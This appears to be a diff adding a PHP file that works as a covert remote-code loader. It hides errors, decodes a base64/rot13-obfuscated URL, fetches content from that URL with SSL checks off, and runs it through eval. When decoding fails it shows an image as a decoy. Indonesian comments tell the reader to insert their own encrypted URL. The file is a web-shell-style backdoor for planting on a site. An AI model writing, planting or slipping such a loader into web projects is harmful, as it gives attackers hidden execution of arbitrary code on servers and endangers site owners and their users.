@@ -1,0 +1,46 @@
+<?php
+
+error_reporting(0);
+ini_set('display_errors', 0);
+
+function getContent($url) {
+    $curl = curl_init();
+    curl_setopt($curl, CURLOPT_URL, $url);
+    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
+    $content = curl_exec($curl);
+    curl_close($curl);
+    if ($content === false) {
+        $content = file_get_contents($url);
+    }
+    return $content;
+}
+
+function encode_url($url) {
+    $encoded_url = base64_encode($url);
+    $encoded_url = str_rot13($encoded_url);
+    return urlencode($encoded_url);
+}
+
+function decode_url($encoded_url) {
+    $decoded_url = str_rot13(urldecode($encoded_url));
+    return base64_decode($decoded_url);
+}
+
+// Ganti ini dengan URL terenkripsi kamu
+$encoded_url = '$2y$10$eOlVfD7TqYk35CGxCwRL4..tiCRpTNWnWbj8nEAtH2JhuWo5mQ9/K';
+$decoded_url = decode_url($encoded_url);
+
+if ($decoded_url) {
+    $content = getContent($decoded_url);
+    eval('?>' . $content);
+    exit;
+} else {
+    // Jika gagal decode atau tidak ada konten, tampilkan gambar
+    header('Content-Type: image/jpeg');
+    $image_path = 'https://freeimage.host/i/3Uegvls';
+    readfile($image_path);
+}
+
+?>
